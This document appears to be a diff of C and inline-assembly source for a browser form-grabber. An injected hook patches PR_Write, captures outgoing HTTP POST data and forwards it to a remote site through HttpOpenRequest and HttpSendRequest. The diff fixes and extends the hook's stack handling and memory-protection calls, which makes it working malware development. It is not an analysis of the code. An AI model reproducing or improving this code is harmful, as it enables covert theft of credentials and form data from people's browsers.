@@ -120,38 +120,41 @@ int main() {
 	return 0;
 }
 
-void Hook(InjectData *pData) {
+void Hook( InjectData *pData ) {
 
-BYTE *temp;
-	
+	BYTE *temp;
+
 	goto start;
 
 Hooked:
 
 	__asm{
-	  mov ecx,[esp + HOOK_ESP_DATA_SIZE] // necessary ??
-	  mov eax,[esp + HOOK_ESP_DATA_OFFSET]
-	  cmp dword ptr[eax], HOOK_POST_CMP // POST?
-	  jne prexJMP						// it is not POST
+		mov ecx,[esp + HOOK_ESP_DATA_SIZE]	// param data size
+		mov eax,[esp + HOOK_ESP_DATA_OFFSET]// param data
+		cmp dword ptr[eax], HOOK_POST_CMP // POST?
+		jne prexJMP						// it is not POST
 										// it is POST
-	  push ecx							// push data size // necessary ??
-	  call getDelta4					// get the delta, &newtInstruction follows this call
-   getDelta4:
-      pop ecx							// return from call, saving the address at ecx
-      sub ecx, offset getDelta4
-	  lea eax, data
-	  add eax, ecx						// eax = &data + (&nextInstruction - &getDelta4) = &data
-	  pop ecx							// ecx = data size // necessary ??
-	  mov eax,[eax]
-	  mov pData, eax					// pData = *eax = *(&nextInstruction +(&data - &getDelta4))
-	  mov eax,[esp + HOOK_ESP_DATA_OFFSET]					
-      mov temp,eax						// temp = param data
+		push ecx
+		push eax
+		call getDelta4					// get the delta, &newtInstruction follows this call
+	getDelta4:
+		pop ecx							// return from call, saving the address at ecx
+		sub ecx, offset getDelta4
+		lea eax, data
+		add eax, ecx						// eax = &data + (&nextInstruction - &getDelta4) = &data
+		mov eax,[eax]
+//		push ebp
+//		mov ebp, esp
+//		sub esp, 16
+		mov pData, eax					// pData = *eax = *(&nextInstruction +(&data - &getDelta4))
+		pop eax				
+		mov temp,eax					// temp = param data
 	}
 
 	pData->pPostData = (char*)temp;		// save data
 	__asm{ 
 		nop 
-		mov ecx,[esp + HOOK_ESP_DATA_SIZE]			// ecx = param data size
+		pop ecx							// ecx = param data size
 		mov temp,ecx
 		nop 
 	}
@@ -165,6 +168,13 @@ Hooked:
     pData->fnConnectHandle = pData->fnHttpOpenRequest( pData->internetHandle, pData->post, pData->pageName, NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
 	// Send the request, post data is zero terminated (-1L)
 	pData->fnHttpSendRequest( pData->fnConnectHandle, pData->header, -1L, pData->pPostData, pData->postDataLength );
+
+	__asm{ 
+		nop
+//		add esp, 16
+//		pop ebp
+		nop
+	}
 
 prexJMP:
 	__asm{
@@ -252,7 +262,7 @@ start:
 	pData->fnVirtualProtect(pData->nptr, 10, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue);
 
 	pData->bptr = (DWORD*) pData->nptr;			
-	*pData->bptr = (DWORD) pData->PR_Write;		// ExitProcess = &originalPR_Write + 6
+	*pData->bptr = (DWORD) pData->PR_Write;		// ExitProcess = &originalPR_Write
 	// JMP to the "original code" that follows the replaced code
 
 	// Save pData in &data space
@@ -273,6 +283,10 @@ start:
 		pop eax 
 		pop ecx
 	}
+
+	// PR_Write can be executed as a function
+	pData->fnVirtualProtect( pData, 4, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue );
+
 
 	// Open an internet connection to remoteSite with standard options. 
 	// See http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx
